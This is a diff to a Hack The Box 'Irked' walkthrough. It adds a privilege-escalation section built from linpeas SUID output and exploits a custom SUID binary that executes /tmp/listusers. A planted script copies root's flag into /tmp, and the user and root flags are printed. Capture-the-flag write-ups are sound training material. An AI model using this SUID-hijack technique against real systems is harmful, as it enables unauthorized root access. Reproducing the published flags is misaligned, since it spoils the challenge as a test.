@@ -1,5 +1,14 @@
 # [07 - Irked](https://app.hackthebox.com/machines/Irked)
 
+  * [description](#description)
+  * [walkthrough](#walkthrough)
+    * [recon](#recon)
+    * [80](#80)
+    * [6697](#6697)
+    * [ircd](#ircd)
+    * [djmardov](#djmardov)
+    * [over the line](#over-the-line)
+  * [flag](#flag)
 ![Irked.png](Irked.png)
 
 ## description
@@ -844,8 +853,107 @@ right, no curl here
 
 and after struggling with python for a bit -- and finding out there is no `requests` module.. the cups version of Antique that is vulnerable.. is not what we're running here.
 
+
+```
+djmardov@irked:~$ cat .cache/.mc_connections
+/org/freedesktop/Telepathy/Connection/idle/irc/djmardov_40localhost0x8ea91f0    :1.78   idle/irc/djmardov0
+```
+
+```
+djmardov@irked:~$ export PATH=$PATH:/usr/sbin
+djmardov@irked:~$ which lpadmin
+/usr/sbin/lpadmin
+```
+much better.
+
+
+### over the line
+
+looking at the machine page, see that `SUID exploitation` is a tag, and we haven't plumbed that yet.
+
+from linpeas:
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+strace Not Found
+-rwsr-xr-- 1 root messagebus 355K Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 9.3K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 14K Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 550K Nov 19  2017 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary)
+-rwsr-xr-x 1 root root 1.1M Feb 10  2018 /usr/sbin/exim4
+-rwsr-xr-- 1 root dip 332K Apr 14  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root root 43K May 17  2017 /usr/bin/chsh
+-rwsr-sr-x 1 root mail 94K Nov 18  2017 /usr/bin/procmail
+-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 38K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-sr-x 1 daemon daemon 50K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 18K Sep  8  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-sr-x 1 root root 9.3K Apr  1  2014 /usr/bin/X
+-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary)
+-rwsr-xr-x 1 root root 95K Aug 13  2014 /sbin/mount.nfs
+-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 34K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 34K Jan 21  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 158K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+-rwsr-xr-x 1 root root 26K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)
+```
+
+a lot of the usual suspects here, but `exim4` and `procmail` look interesting.
+
+additionally,
+```
+-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary)
+-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary)
+```
+
+```
+djmardov@irked:~$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2022-07-26 11:27 (:0)
+djmardov pts/0        2022-07-26 11:28 (10.10.14.9)
+sh: 1: /tmp/listusers: not found
+```
+
+interesting, we can definitely control `/tmp/listusers` and.. it looks like they are blindly executing it
+
+```
+djmardov@irked:~$ chmod +x /tmp/listusers
+djmardov@irked:~$ cat /tmp/listusers
+#!/bin/sh
+cp /root/root.txt /tmp/
+chmod 0644 /tmp/root.txt
+djmardov@irked:~$ ls -l /tmp
+total 20
+-rwxr-xr-x 1 djmardov djmardov   59 Jul 26 17:51 listusers
+drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-colord.service-dUjBdK
+drwx------ 3 root     root     4096 Jul 26 11:32 systemd-private-3d6e771b211647a7a79d0b0973174941-cups.service-ZtOxF7
+drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-rtkit-daemon.service-dH9DZO
+drwx------ 2 root     root     4096 Jul 26 11:27 vmware-root
+djmardov@irked:~$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2022-07-26 11:27 (:0)
+djmardov pts/0        2022-07-26 11:28 (10.10.14.9)
+djmardov@irked:~$ ls -l /tmp
+total 24
+-rwxr-xr-x 1 djmardov djmardov   59 Jul 26 17:51 listusers
+-rw------- 1 root     djmardov   33 Jul 26 17:51 root.txt
+drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-colord.service-dUjBdK
+drwx------ 3 root     root     4096 Jul 26 11:32 systemd-private-3d6e771b211647a7a79d0b0973174941-cups.service-ZtOxF7
+drwx------ 3 root     root     4096 Jul 26 11:27 systemd-private-3d6e771b211647a7a79d0b0973174941-rtkit-daemon.service-dH9DZO
+drwx------ 2 root     root     4096 Jul 26 11:27 vmware-root
+djmardov@irked:~$ cat /tmp/root.txt
+8d8e9e8be64654b6dccc3bff4522daf3
+```
+
+awwwww yeah.
+
 ## flag
 ```
 user:4a66a78b12dc0e661a59d3f5c0267a8e
-root:
+root:8d8e9e8be64654b6dccc3bff4522daf3
 ```
